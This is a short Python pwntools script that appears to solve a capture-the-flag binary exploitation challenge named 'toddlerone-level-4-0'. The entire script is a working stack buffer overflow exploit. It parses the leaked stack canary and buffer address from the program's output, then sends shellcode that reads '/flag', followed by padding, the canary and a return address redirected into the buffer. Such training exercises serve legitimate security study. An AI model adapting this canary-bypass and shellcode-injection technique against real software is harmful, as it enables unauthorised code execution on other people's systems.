#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-4-0')

buff_len = 112
io = elf.process()
io.sendline("512")
io.sendline("REPEAT")
io.recvuntil(b"the canary value is now 0x")
temp = io.recvuntil(b'.').decode()
print(temp)
CANARY = p64(int(temp[:-1],16))
SHELLCODE = asm(shellcraft.cat("/flag"))
io.recvuntil(b"The input buffer begins at 0x")
MAGIC = p64(0x8E5DA77B959C5436)
buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))
print(buff_addr)
PADDING = b'A'*(buff_len - len(SHELLCODE))
PAYLOAD = SHELLCODE + PADDING + MAGIC + CANARY + p64(0xffffffffffffffff) + buff_addr
io.sendline(f"{len(PAYLOAD)}")
io.sendline(PAYLOAD)
io.interactive()